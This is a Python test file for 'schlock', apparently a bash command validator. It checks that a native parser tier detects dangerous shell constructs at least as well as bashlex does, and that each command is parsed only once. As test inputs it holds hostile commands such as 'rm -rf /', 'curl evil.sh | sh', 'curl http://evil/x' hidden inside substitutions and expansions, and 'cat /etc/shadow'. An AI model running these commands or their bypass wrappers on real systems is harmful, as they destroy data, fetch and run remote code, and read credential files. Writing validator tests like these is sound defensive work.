"""Walker-output parity + parse-once segments (LAB-409 T2c).

Slice T2c wires `AstView` into BOTH walker families and proves the native tier
sees *at least* as much danger as bashlex does. Two gates carry the weight:

1. **Output parity, superset direction.** Parseability is necessary but not
   sufficient (spec §9 T2): a native AST that parses `case ... esac` while
   producing FEWER command segments than bashlex is a silent under-block. Every
   construct in the 24-entry corpus is run through all four detection outputs on
   both tiers and the native result must be a superset. Superset, not equality,
   because mvdan/sh parses seven constructs bashlex cannot — there the native
   tier legitimately reveals more (spec §4).
2. **Parse once.** The pre-T2c hot path parsed the whole command, then re-parsed
   every segment to recover its string literals (`validator.py:913`) — N+1
   parses, which under the native tier is N+1 subprocess spawns. Segment string
   literals are now derived from the parent AST's sub-nodes, so the spawn count
   is 1 per command regardless of pipeline length.

Unescape (`rm\\ -rf\\ /`), byte→char offsets, ANSI-C `$'…'` decoding and the
full `validate_command` differential oracle stay with T3; the tests at the
bottom pin those as still-fail-closed so a future widening cannot land silently.
"""

import json
import subprocess
from pathlib import Path

import pytest

from schlock.core.ast_view import UnmappedNodeError
from schlock.core.native_bridge import NativeBridge, NativeBridgeError, resolve_binary
from schlock.core.parser import BashCommandParser
from schlock.core.validator import _get_substitution_validator, clear_caches, validate_command
from schlock.exceptions import ParseError

CORPUS_PATH = Path(__file__).parent.parent / "tools" / "schlock-parse" / "testdata" / "corpus.json"


def _binary_available():
    try:
        resolve_binary()
    except NativeBridgeError:
        return False
    return True


needs_binary = pytest.mark.skipif(
    not _binary_available(),
    reason="no vendored schlock-parse binary for this platform",
)

CORPUS = json.loads(CORPUS_PATH.read_text())

#: The constructs bashlex cannot parse at all (corpus `bashlex_fails`). Native
#: coverage of these IS the migration's payoff, so a regression to
#: `UnmappedNodeError` here must fail the build rather than quietly degrade to
#: the fallback tier (spec §9 T2 acceptance 1).
NATIVE_ONLY_CONSTRUCTS = [entry["name"] for entry in CORPUS if entry["bashlex_fails"]]

#: Corpus constructs the native tier still hands to bashlex, each with the slice
#: that owns it. The parity gate consults this allowlist instead of skipping on
#: any raise: otherwise a regression that made `if`/`for`/`case` fail closed
#: again would look identical to a documented ceiling, and the gate would go
#: quiet exactly when it mattered.
KNOWN_FALLBACK_CEILINGS = {
    "escaped-space-word": "T3 — per-WordPart backslash unescape (spec §4a)",
    "ansi-c-quoting": "T3 — ANSI-C decoding; bashlex under-decodes, so T3's oracle rules",
    "comments-and-blank-lines": "CLI parses comments off, so a trailing one reads as a prefix parse",
    "arith-command": "bashlex misreads `(( … ))` as a command named after the expression",
}


def walker_outputs(command: str, ast_nodes: list) -> "dict[str, set]":
    """Run all four detection walkers over `ast_nodes`, as comparable sets.

    Sets, not lists: parity is about WHAT was detected, and bashlex's traversal
    order is not a contract either walker family relies on.
    """
    parser = BashCommandParser()
    sub_validator = _get_substitution_validator()
    return {
        "segments": set(parser.extract_command_segments(command, ast_nodes)),
        "dangerous_constructs": set(parser.has_dangerous_constructs(ast_nodes)),
        "commands_with_args": {(name, tuple(args)) for name, args in parser.extract_commands_with_args(ast_nodes)},
        "substitutions": {
            (sub.substitution_type.name, sub.inner_command, sub.base_command)
            for sub in sub_validator.extract_substitutions(ast_nodes)
        },
    }


def native_outputs(command: str) -> "dict[str, set]":
    return walker_outputs(command, NativeBridge().parse(command))


def bashlex_outputs(command: str) -> "dict[str, set] | None":
    """Walker outputs on the bashlex tier, or None if bashlex cannot parse."""
    parser = BashCommandParser()
    try:
        return walker_outputs(command, parser.parse(command))
    except Exception:  # noqa: BLE001 - any bashlex failure means "no baseline to compare against"
        return None


@needs_binary
class TestCorpusOutputParity:
    """Native detection output ⊇ bashlex detection output, over the corpus."""

    @pytest.mark.parametrize("entry", CORPUS, ids=[e["name"] for e in CORPUS])
    def test_native_output_is_superset_of_bashlex(self, entry):
        command = entry["script"]
        try:
            native = native_outputs(command)
        except (UnmappedNodeError, NativeBridgeError) as exc:
            # A raise routes to the bashlex tier, which by definition matches
            # itself — but only a construct on the documented ceiling list may
            # take that exit.
            assert entry["name"] in KNOWN_FALLBACK_CEILINGS, f"undocumented native-tier regression: {exc}"
            return

        baseline = bashlex_outputs(command)
        if baseline is None:
            pytest.skip("bashlex cannot parse this construct; no parity baseline")
        for output, expected in baseline.items():
            missing = expected - native[output]
            assert not missing, f"{output}: native tier missed {missing} that bashlex found"

    @pytest.mark.parametrize(
        "name",
        sorted(
            set(NATIVE_ONLY_CONSTRUCTS)
            | {"function-definition", "case-statement", "for-loop", "if-statement"} - set(KNOWN_FALLBACK_CEILINGS)
        ),
    )
    def test_widened_constructs_convert(self, name):
        """Must produce an AstView, not a raise — the constructs bashlex rejects
        (the migration's payoff) plus the clauses T2b deferred to T2c."""
        command = next(e["script"] for e in CORPUS if e["name"] == name)
        NativeBridge().parse(command)


@needs_binary
class TestDangerousVariantsReachTheWalkers:
    """Parseability is not the gate — the danger must be VISIBLE to a walker.

    One dangerous variant per newly-mapped construct (spec §4): a construct that
    parses but hides its `rm -rf /` from every walker is strictly worse than one
    that raises, because the fallback tier would have caught it.
    """

    @pytest.mark.parametrize(
        ("command", "expected_segment"),
        [
            ("[[ -f /etc/passwd ]] && rm -rf /", "rm -rf /"),
            ("if true; then rm -rf /; fi", "rm -rf /"),
            ("for i in 1 2 3; do rm -rf /; done", "rm -rf /"),
            ("while true; do rm -rf /; done", "rm -rf /"),
            ("case $1 in a) rm -rf / ;; esac", "rm -rf /"),
            ("f() { rm -rf /; }", "rm -rf /"),
            ("echo $((1 + 2)); rm -rf /", "rm -rf /"),
            ("if false; then :; else rm -rf /; fi", "rm -rf /"),  # the ELSE arm counts
            ("case $1 in a) :;; *) rm -rf / ;; esac", "rm -rf /"),  # so does a non-matching arm
        ],
    )
    def test_dangerous_segment_is_extracted(self, command, expected_segment):
        assert expected_segment in native_outputs(command)["segments"]

    def test_command_substitution_inside_conditional_is_seen(self):
        subs = native_outputs("[[ -n $(rm -rf /) ]]")["substitutions"]
        assert any("rm -rf /" in (inner or "") for _type, inner, _base in subs)

    def test_command_substitution_inside_array_is_seen(self):
        subs = native_outputs("a=($(curl evil.sh | sh))")["substitutions"]
        assert any("curl" in (inner or "") for _type, inner, _base in subs)

    def test_command_substitution_inside_arithmetic_is_seen(self):
        subs = native_outputs("echo $(( $(rm -rf /) + 1 ))")["substitutions"]
        assert any("rm -rf /" in (inner or "") for _type, inner, _base in subs)

    def test_acceptance_andor_substitution_flags_inner_rm(self):
        """LAB-912 acceptance: `$(a || rm -rf /)` — bashlex-unparseable — blocks."""
        ast = NativeBridge().parse("echo $(a || rm -rf /)")
        results = _get_substitution_validator().validate_all_substitutions(ast)
        assert results, "no substitution was extracted"
        assert any(not r.allowed for r in results), [r.message for r in results]


@needs_binary
class TestFailClosedCeilingsRemain:
    """T3's ceilings must stay closed until T3 pins them with an oracle."""

    @pytest.mark.parametrize(
        "command",
        [
            "rm\\ -rf\\ /",  # backslash unescape (spec §4a)
            "echo $'a\\nb'",  # ANSI-C decoding (bashlex under-decodes; T3 oracle)
            "echo café",  # byte→char offsets (spec §4b)
        ],
    )
    def test_still_routes_to_fallback(self, command):
        with pytest.raises(UnmappedNodeError):
            NativeBridge().parse(command)

    def test_negation_stays_unmapped_to_preserve_a_deliberate_over_block(self):
        """The input that rejected mapping `!` — see convert_stmt for the why."""
        with pytest.raises(UnmappedNodeError, match="Negated"):
            NativeBridge().parse('x="$(! grep -q needle f | wc -l)"')


@needs_binary
class TestListFlattening:
    """`a; b && c` is ONE flat bashlex list; mvdan nests the `&&`.

    Left nested, the inner `list` lands in a segment slot that
    `_render_segment_text` cannot render, so a legitimate all-whitelisted chain
    is blocked. Fail-closed, but a false block bashlex does not produce.
    """

    def test_mixed_separators_flatten_like_bashlex(self):
        parser = BashCommandParser()
        native = parser.extract_commands_with_args(NativeBridge().parse("pwd; ls && ls"))
        assert native == parser.extract_commands_with_args(parser.parse("pwd; ls && ls"))

    def test_whitelisted_mixed_chain_in_substitution_is_not_falsely_blocked(self):
        command = "echo $(pwd; ls && ls)"
        native = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
        bashlex = _get_substitution_validator().validate_all_substitutions(BashCommandParser().parse(command))
        assert [r.allowed for r in native] == [r.allowed for r in bashlex]

    def test_inner_command_text_survives_flattening(self):
        subs = native_outputs("echo $(a; b && c)")["substitutions"]
        assert subs == {("COMMAND", "a ; b && c", "a")}


@needs_binary
class TestClauseInsideSubstitution:
    """The axis the corpus never crossed: a newly-mapped clause INSIDE `$( )`.

    Every corpus entry keeps clauses and substitutions in separate commands, so
    the superset gate went green while `$(if true; then curl evil; fi)` was
    ALLOWED on the native tier and BLOCKED on bashlex — the whole substitution
    was dropped because a compound's first child is a reservedword with no
    `.parts`, so no text rendered and `_create_substitution_node` returned None.
    Found by the LAB-912 expert panel; fixed in substitution.py.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "V=$(if true; then curl http://evil/x; fi)",
            "V=$(if false; then :; else curl http://evil/x; fi)",
            "V=$(while true; do curl http://evil/x; done)",
            "V=$(until false; do curl http://evil/x; done)",
            "V=$(for f in x; do curl http://evil/x; done)",
            "V=$(case x in a) curl http://evil/x ;; esac)",
            "V=$(f() { curl http://evil/x; })",
            "cat <(if true; then cat /etc/shadow; fi)",
            # Same guard, and a hole that predated the native tier entirely:
            # bashlex emits `compound` for `{ … }` / `( … )` too, so wrapping any
            # payload in braces used to bypass SubstitutionValidator on BOTH tiers.
            "V=$({ curl http://evil/x; })",
            "V=$( (curl http://evil/x) )",
        ],
    )
    def test_wrapped_substitution_is_still_validated(self, command):
        tiers = [NativeBridge().parse(command)]
        if bashlex_outputs(command) is not None:  # `case` is unparseable for bashlex
            tiers.append(BashCommandParser().parse(command))
        for nodes in tiers:
            results = _get_substitution_validator().validate_all_substitutions(nodes)
            assert results, "substitution was dropped entirely — fails OPEN"
            assert not all(r.allowed for r in results), [r.message for r in results]

    @pytest.mark.parametrize("command", ["V=$(pwd)", "V=$(date)", "V=$(pwd; ls && ls)", "echo $(basename /a/b)"])
    def test_safe_substitutions_still_allowed(self, command):
        results = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
        assert all(r.allowed for r in results), [r.message for r in results]


@needs_binary
class TestParameterExpansionSubstitutions:
    """`${z:-$(…)}` and friends EXECUTE their inner substitution.

    A childless `parameter` node hid all four expansion forms from
    SubstitutionValidator. bashlex misses them too, so this is the superset
    direction — but T2c turned three of them into a live regression by parsing
    constructs (`$(( ))`, `[[ ]]`, arrays) whose bashlex ParseError used to
    fail closed. Found by the LAB-912 expert panel.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "echo ${z:-$(curl http://evil/x)}",  # default value
            "echo ${z:=$(curl http://evil/x)}",  # assign-default
            "echo ${z/x/$(curl http://evil/x)}",  # replacement
            "echo ${z:$(curl http://evil/x):1}",  # substring offset
            "echo ${a[$(curl http://evil/x)]}",  # subscript
            "echo $(( ${z:-$(curl http://evil/x)} ))",  # inside arithmetic
            "[[ -f ${z:-$(curl http://evil/x)} ]]",  # inside a conditional
            "a=(${z:-$(curl http://evil/x)})",  # inside an array element
        ],
    )
    def test_expansion_substitution_reaches_the_validator(self, command):
        results = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
        assert results, "substitution inside the expansion was invisible"
        assert not all(r.allowed for r in results), [r.message for r in results]

    def test_plain_expansions_are_untouched(self):
        for command in ("echo ${z:-fallback}", "echo ${#z}", "echo ${!z}", "echo ${z}", "echo $z"):
            assert not _get_substitution_validator().extract_substitutions(NativeBridge().parse(command))

    def test_expansion_words_create_no_literal_suppression_ranges(self):
        # A quoted default spliced as a generic `word` node would register as a
        # quoted-literal range and MASK rule matches on its content — bashlex's
        # childless `parameter` node creates no such range, so this is the
        # under-block direction (PR #137 review).
        command = 'echo ${z:-"rm -rf /"}'
        assert BashCommandParser().extract_string_literals(command, NativeBridge().parse(command)) == []

    @pytest.mark.parametrize(
        "command",
        [
            'echo ${z:-$(echo "rm -rf /")}',  # default value
            'echo ${z:=$(echo "rm -rf /")}',  # assign-default
            'echo ${z/x/$(echo "rm -rf /")}',  # replacement
            'echo ${z:$(echo "rm -rf /"):1}',  # substring offset
            'echo ${a[$(echo "rm -rf /")]}',  # subscript
            'echo ${z:-$(echo "a${y:-$(echo "rm -rf /")}b")}',  # two splices deep
        ],
    )
    def test_nested_expansion_words_create_no_literal_suppression_ranges(self, command):
        """Dropping the `word` wrappers only closed the SHALLOW case (LAB-1584).

        A quoted word NESTED inside the spliced subtree is a genuine `word` node
        with a quote-delimited span, so it registered a suppression range all the
        same — `echo ${z:-$(echo "rm -rf /")}` derived `[(18, 26)]` on the native
        tier against bashlex's `[]`. Suppression SHRINKS the danger surface, so
        that is the under-block direction and it must be zero at every depth.
        """
        parser = BashCommandParser()
        assert parser.extract_string_literals(command, NativeBridge().parse(command)) == []
        assert parser.extract_string_literals(command, parser.parse(command)) == []

    @pytest.mark.parametrize(
        "command",
        [
            'echo "rm -rf /"',  # plain quoted argument
            'echo $(echo "rm -rf /")',  # quoted word inside a plain $( )
            'echo "${x:-rm -rf /}"',  # the expansion IS the quoted word
            'echo "$x"',  # ditto, shortest form — span equality, not containment
            'echo ${z:-$(rm -rf /)} "keep me"',  # sibling of an expansion
        ],
    )
    def test_literal_suppression_outside_expansions_is_unchanged(self, command):
        """The LAB-1584 filter drops ranges STRICTLY inside a `parameter` span only.

        Equality must keep the range: `echo "$x"` has word (5, 9) → range (6, 8)
        and parameter (6, 8), and bashlex derives that range too. Over-dropping
        here would turn quoted data into false positives on both tiers.
        """
        parser = BashCommandParser()
        assert parser.extract_string_literals(command, NativeBridge().parse(command)) == parser.extract_string_literals(
            command, parser.parse(command)
        )

    @pytest.mark.parametrize(
        "command",
        [
            '[[ -f "rm -rf /" ]]',
            'a=("rm -rf /")',
            'echo $(( "1" ))',
        ],
    )
    def test_native_only_constructs_may_derive_literals_bashlex_never_sees(self, command):
        """AC-3: the other native-only splice sites need no fix, and here is why.

        `[[ ]]`, array elements and `$(( ))` all splice operand words the same
        way, so the native tier does derive suppression ranges inside them — but
        bashlex cannot parse any of the three at all, so there is no bashlex
        verdict for a native suppression to under-cut. The ranges are also
        CORRECT (a quoted test operand really is data). The parity contract binds
        only where bashlex produces a verdict; this test pins the fail-closed
        premise that argument rests on, so a bashlex upgrade that starts parsing
        these constructs re-opens the question instead of silently diverging.
        """
        parser = BashCommandParser()
        assert parser.extract_string_literals(command, NativeBridge().parse(command))
        with pytest.raises(ParseError):
            parser.parse(command)


class TestDeepNestingRoutesToFallback:
    """A bridge-side stack overflow is a BRIDGE failure, not a verdict.

    bashlex parses ~350 levels of nesting; the bridge blows the Python stack
    first — in the recursive converter, or (3.9) already inside the json
    decoder. Escaping as a bare RecursionError would skip T5's router and
    hard-deny input the fallback tier handles fine. The `__cause__` assertion
    pins the recursion path: without it a healthy bridge that merely rejects
    the input (any NativeBridgeError) would keep this test green without ever
    exercising the fail-closed contract it documents.
    """

    @needs_binary
    def test_recursion_error_becomes_a_native_bridge_error(self):
        command = "if true; then " * 400 + "rm -rf /" + "; fi" * 400
        with pytest.raises(NativeBridgeError) as excinfo:
            NativeBridge().parse(command)
        assert isinstance(excinfo.value.__cause__, RecursionError), excinfo.value


@needs_binary
class TestKnownBashlexUnderDecode:
    """One divergence the sweep found where native is RIGHT and bashlex is wrong.

    Pinned so T3 inherits it, and so a bashlex upgrade that changes the fallback
    tier's decode trips a test. Safe to diverge: the mangling needs an adjacent
    literal, so the mangled word always carries that literal too and can never
    collapse to a bare dangerous command.
    """

    def test_single_quotes_concatenated_with_a_literal(self):
        # bash's value for `'a"b'x` is `a"bx`; bashlex drops the inner quotes
        # whenever a SglQuoted part is concatenated with a Lit.
        parser = BashCommandParser()
        command = "echo 'a\"b'x"
        assert parser.extract_commands_with_args(parser.parse(command)) == [("echo", ["abx"])]
        assert parser.extract_commands_with_args(NativeBridge().parse(command)) == [("echo", ['a"bx'])]


class TestParseOnce:
    """One parse per command — the segment loop must not re-parse (spec §3.2)."""

    def test_validate_command_parses_exactly_once(self, monkeypatch):
        clear_caches()
        calls = []
        real_parse = BashCommandParser.parse

        def counting_parse(self, command):
            calls.append(command)
            return real_parse(self, command)

        monkeypatch.setattr(BashCommandParser, "parse", counting_parse)
        validate_command('grep "needle" file.txt | wc -l')
        assert calls == ['grep "needle" file.txt | wc -l'], f"re-parsed segments: {calls[1:]}"

    @needs_binary
    def test_native_tier_spawns_one_process_per_command(self, monkeypatch):
        spawns = []
        real_popen = subprocess.Popen

        def counting_popen(*args, **kwargs):
            spawns.append(args[0])
            return real_popen(*args, **kwargs)

        monkeypatch.setattr(subprocess, "Popen", counting_popen)
        command = 'grep "needle" file.txt | wc -l'
        ast = NativeBridge().parse(command)
        segments = BashCommandParser().extract_command_segments_with_literals(command, ast)
        assert len(segments) == 2
        assert len(spawns) == 1, f"{len(spawns)} spawns for one command"

    @pytest.mark.parametrize(
        "command",
        [
            'grep "needle" file.txt | wc -l',
            "ls | rm -rf / && echo done",
            "echo 'quoted' ; cat file",
            "cmd > out.log 2>&1",
            'git commit -m "fix: thing" && git push',
        ],
    )
    def test_derived_literals_match_a_per_segment_reparse(self, command):
        """The derived offsets must equal what the replaced re-parse produced.

        This is the refactor's safety net: string literals SUPPRESS rule matches,
        so an offset that drifts left turns a real match into a false negative.
        """
        parser = BashCommandParser()
        ast = parser.parse(command)
        for segment, literals in parser.extract_command_segments_with_literals(command, ast):
            expected = parser.extract_string_literals(segment, parser.parse(segment))
            assert literals == expected, f"segment {segment!r}"

    def test_heredoc_segment_gains_the_literal_suppression_it_should_have_had(self):
        """The one deliberate verdict change in the parse-once switch.

        A heredoc segment cannot be parsed standalone (its body sits outside the
        segment span), so the old per-segment re-parse threw, fell back to NO
        literals, and matched `rm -rf /` inside a quoted argument — a false
        positive. Parent-derived ranges make the suppression consistent with
        every other segment. `cat "rm -rf /"` passes that string as a FILENAME;
        nothing executes it, so dropping the match is the correct direction.
        """
        parser = BashCommandParser()
        command = 'ls; cat "rm -rf /" <<EOF\nbody\nEOF\n'
        heredoc_segments = [
            (text, literals)
            for text, literals in parser.extract_command_segments_with_literals(command, parser.parse(command))
            if "<<" in text
        ]
        assert heredoc_segments == [('cat "rm -rf /" <<EOF', [(5, 13)])]
        with pytest.raises(Exception, match="."):  # noqa: B017,PT011 - bashlex's own error type varies
            parser.parse(heredoc_segments[0][0])

    def test_segment_text_is_unchanged_by_the_refactor(self):
        parser = BashCommandParser()
        command = "ls | rm -rf / && echo done"
        ast = parser.parse(command)
        with_literals = parser.extract_command_segments_with_literals(command, ast)
        assert [text for text, _literals in with_literals] == parser.extract_command_segments(command, ast)
